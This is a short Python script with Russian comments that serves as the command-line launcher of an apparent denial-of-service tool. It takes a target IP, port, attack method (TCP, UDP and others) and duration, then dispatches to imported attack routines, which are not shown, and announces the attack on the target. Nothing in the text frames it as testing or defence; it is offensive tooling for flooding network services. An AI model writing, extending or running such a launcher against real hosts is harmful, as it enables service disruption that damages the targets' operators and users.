import argparse
from sender.methods import get_method
from sender.utils.validator import validate_input
from sender.settings.config import Settings

def main():
    # Настройки парсера аргументов командной строки
    parser = argparse.ArgumentParser(description='Утилита для отправки сетевых пакетов')
    parser.add_argument('--ip', required=True, help='Целевой IP адрес')
    parser.add_argument('--port', required=True, type=int, help='Целевой порт')
    parser.add_argument('--method', required=True, help='Метод атаки (tcp, udp и др.)')
    parser.add_argument('--time', required=True, type=int, help='Длительность в секундах')
    
    args = parser.parse_args()
    
    # Загрузка настроек
    settings = Settings()
    
    # Валидация входных данных
    if not validate_input(args.ip, args.port, args.method, args.time, settings):
        return
    
    # Получение и запуск метода
    method = get_method(args.method)
    if method:
        print(f"Запуск {args.method} атаки на {args.ip}:{args.port} в течение {args.time} сек.")
        method(args.ip, args.port, args.time, settings).attack()
    else:
        print(f"Ошибка: неизвестный метод - {args.method}")

if __name__ == "__main__":
    main()
